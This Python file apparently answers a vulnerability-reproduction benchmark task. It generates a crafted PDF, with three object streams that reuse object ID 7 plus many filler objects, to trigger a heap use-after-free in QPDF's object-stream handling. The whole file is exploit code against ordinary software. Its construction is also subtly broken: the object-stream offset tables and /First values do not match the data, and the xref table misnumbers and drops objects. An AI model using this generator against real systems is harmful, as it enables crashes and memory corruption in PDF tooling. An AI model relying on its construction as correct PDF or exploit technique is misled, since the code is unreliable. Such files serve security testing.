import os
import subprocess
import tempfile
import hashlib
import random
import struct
import zlib
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC generates a PDF file that triggers the heap use-after-free
        # vulnerability in QPDFWriter::preserveObjectStreams
        
        # The vulnerability occurs when QPDF::getCompressibleObjSet deletes
        # objects from the object cache when there are multiple entries for
        # the same object id in object streams
        
        # Build the PDF with:
        # 1. Multiple object streams containing the same object IDs
        # 2. Object streams that will be preserved during optimization
        # 3. Overlapping object references that trigger the cache deletion
        
        # Create a PDF with the structure to trigger the bug
        pdf_content = self._build_trigger_pdf()
        
        return pdf_content
    
    def _build_trigger_pdf(self) -> bytes:
        """Build the PDF that triggers the use-after-free vulnerability"""
        
        # We'll create a PDF with object streams that have duplicate object IDs
        # This triggers the bug in QPDF::getCompressibleObjSet when it tries
        # to delete objects from the cache
        
        # PDF Header
        pdf = b'%PDF-1.4\n\n'
        
        # Track object offsets
        obj_offsets = {}
        
        # Create object streams with duplicate object IDs
        # Object 1: Catalog
        obj_offsets[1] = len(pdf)
        pdf += b'1 0 obj\n'
        pdf += b'<<\n'
        pdf += b'  /Type /Catalog\n'
        pdf += b'  /Pages 2 0 R\n'
        pdf += b'>>\n'
        pdf += b'endobj\n\n'
        
        # Object 2: Pages
        obj_offsets[2] = len(pdf)
        pdf += b'2 0 obj\n'
        pdf += b'<<\n'
        pdf += b'  /Type /Pages\n'
        pdf += b'  /Kids [3 0 R]\n'
        pdf += b'  /Count 1\n'
        pdf += b'>>\n'
        pdf += b'endobj\n\n'
        
        # Object 3: Page
        obj_offsets[3] = len(pdf)
        pdf += b'3 0 obj\n'
        pdf += b'<<\n'
        pdf += b'  /Type /Page\n'
        pdf += b'  /Parent 2 0 R\n'
        pdf += b'  /MediaBox [0 0 612 792]\n'
        pdf += b'  /Contents 4 0 R\n'
        pdf += b'  /Resources <<\n'
        pdf += b'    /Font <<\n'
        pdf += b'      /F1 5 0 R\n'
        pdf += b'    >>\n'
        pdf += b'  >>\n'
        pdf += b'>>\n'
        pdf += b'endobj\n\n'
        
        # Object 4: Content stream
        obj_offsets[4] = len(pdf)
        pdf += b'4 0 obj\n'
        pdf += b'<< /Length 44 >>\n'
        pdf += b'stream\n'
        pdf += b'BT\n'
        pdf += b'/F1 24 Tf\n'
        pdf += b'100 700 Td\n'
        pdf += b'(Hello World) Tj\n'
        pdf += b'ET\n'
        pdf += b'endstream\n'
        pdf += b'endobj\n\n'
        
        # Object 5: Font
        obj_offsets[5] = len(pdf)
        pdf += b'5 0 obj\n'
        pdf += b'<<\n'
        pdf += b'  /Type /Font\n'
        pdf += b'  /Subtype /Type1\n'
        pdf += b'  /BaseFont /Helvetica\n'
        pdf += b'>>\n'
        pdf += b'endobj\n\n'
        
        # Create object streams with duplicate object IDs - this is the key part
        # First object stream (obj 6)
        obj_offsets[6] = len(pdf)
        
        # Object stream contains objects 7, 8, 9
        # But we'll reference object 7 again in another object stream
        obj_stream_data = b'7 0 8 100 9 200\n'
        obj_stream_data += b'<< /Type /ObjStmTest1 >>\n'
        obj_stream_data += b'<< /Type /ObjStmTest2 >>\n'
        obj_stream_data += b'<< /Type /ObjStmTest3 >>\n'
        
        compressed_data = zlib.compress(obj_stream_data)
        
        pdf += b'6 0 obj\n'
        pdf += b'<<\n'
        pdf += b'  /Type /ObjStm\n'
        pdf += b'  /N 3\n'
        pdf += b'  /First 20\n'
        pdf += b'  /Filter /FlateDecode\n'
        pdf += b'  /Length ' + str(len(compressed_data)).encode() + b'\n'
        pdf += b'>>\n'
        pdf += b'stream\n'
        pdf += compressed_data
        pdf += b'\nendstream\n'
        pdf += b'endobj\n\n'
        
        # Second object stream (obj 10) with duplicate reference to object 7
        obj_offsets[10] = len(pdf)
        
        # This object stream also contains object 7 (duplicate), plus 11, 12
        obj_stream_data2 = b'7 0 11 100 12 200\n'
        obj_stream_data2 += b'<< /Type /DuplicateObj7 >>\n'
        obj_stream_data2 += b'<< /Type /ObjStmTest4 >>\n'
        obj_stream_data2 += b'<< /Type /ObjStmTest5 >>\n'
        
        compressed_data2 = zlib.compress(obj_stream_data2)
        
        pdf += b'10 0 obj\n'
        pdf += b'<<\n'
        pdf += b'  /Type /ObjStm\n'
        pdf += b'  /N 3\n'
        pdf += b'  /First 20\n'
        pdf += b'  /Filter /FlateDecode\n'
        pdf += b'  /Length ' + str(len(compressed_data2)).encode() + b'\n'
        pdf += b'>>\n'
        pdf += b'stream\n'
        pdf += compressed_data2
        pdf += b'\nendstream\n'
        pdf += b'endobj\n\n'
        
        # Third object stream (obj 13) with yet another reference to object 7
        obj_offsets[13] = len(pdf)
        
        obj_stream_data3 = b'7 0 14 100\n'
        obj_stream_data3 += b'<< /Type /TriplicateObj7 >>\n'
        obj_stream_data3 += b'<< /Type /ObjStmTest6 >>\n'
        
        compressed_data3 = zlib.compress(obj_stream_data3)
        
        pdf += b'13 0 obj\n'
        pdf += b'<<\n'
        pdf += b'  /Type /ObjStm\n'
        pdf += b'  /N 2\n'
        pdf += b'  /First 14\n'
        pdf += b'  /Filter /FlateDecode\n'
        pdf += b'  /Length ' + str(len(compressed_data3)).encode() + b'\n'
        pdf += b'>>\n'
        pdf += b'stream\n'
        pdf += compressed_data3
        pdf += b'\nendstream\n'
        pdf += b'endobj\n\n'
        
        # Add some additional objects to make the PDF more complex
        # This increases the chance of triggering the bug
        for i in range(14, 100):
            obj_offsets[i] = len(pdf)
            pdf += f'{i} 0 obj\n'.encode()
            pdf += b'<<\n'
            pdf += f'  /TestObj {i}\n'.encode()
            pdf += b'  /Data '
            # Add some data to fill up space
            pdf += b'(' + b'X' * 100 + b')\n'
            pdf += b'>>\n'
            pdf += b'endobj\n\n'
        
        # Create a large object stream with many objects (obj 100)
        obj_offsets[100] = len(pdf)
        
        # Build a large object stream with many object references
        obj_stream_header = b''
        obj_stream_objects = b''
        obj_count = 50
        
        for i in range(obj_count):
            obj_num = 101 + i
            offset = len(obj_stream_objects)
            obj_stream_header += f'{obj_num} {offset} '.encode()
            obj_stream_objects += f'<< /InStream {obj_num} /Index {i} >>\n'.encode()
        
        large_obj_stream_data = obj_stream_header.strip() + b'\n' + obj_stream_objects
        compressed_large_data = zlib.compress(large_obj_stream_data)
        
        pdf += b'100 0 obj\n'
        pdf += b'<<\n'
        pdf += b'  /Type /ObjStm\n'
        pdf += f'  /N {obj_count}\n'.encode()
        pdf += f'  /First {len(obj_stream_header.strip()) + 1}\n'.encode()
        pdf += b'  /Filter /FlateDecode\n'
        pdf += b'  /Length ' + str(len(compressed_large_data)).encode() + b'\n'
        pdf += b'>>\n'
        pdf += b'stream\n'
        pdf += compressed_large_data
        pdf += b'\nendstream\n'
        pdf += b'endobj\n\n'
        
        # Create xref table
        xref_start = len(pdf)
        pdf += b'xref\n'
        pdf += b'0 ' + str(len(obj_offsets) + 1).encode() + b'\n'
        
        # First entry (free list head)
        pdf += b'0000000000 65535 f \n'
        
        # Object entries
        for obj_num in range(1, len(obj_offsets) + 1):
            if obj_num in obj_offsets:
                offset = obj_offsets[obj_num]
                pdf += f'{offset:010d} 00000 n \n'.encode()
            else:
                # For objects in object streams
                pdf += b'0000000000 00000 f \n'
        
        # Trailer
        pdf += b'trailer\n'
        pdf += b'<<\n'
        pdf += b'  /Size ' + str(len(obj_offsets) + 1).encode() + b'\n'
        pdf += b'  /Root 1 0 R\n'
        
        # Add ID for reproducibility
        pdf += b'  /ID [<'
        pdf += hashlib.md5(pdf).hexdigest().encode()
        pdf += b'> <'
        pdf += hashlib.md5(pdf).hexdigest().encode()
        pdf += b'>]\n'
        
        pdf += b'>>\n'
        pdf += b'startxref\n'
        pdf += str(xref_start).encode() + b'\n'
        pdf += b'%%EOF\n'
        
        return pdf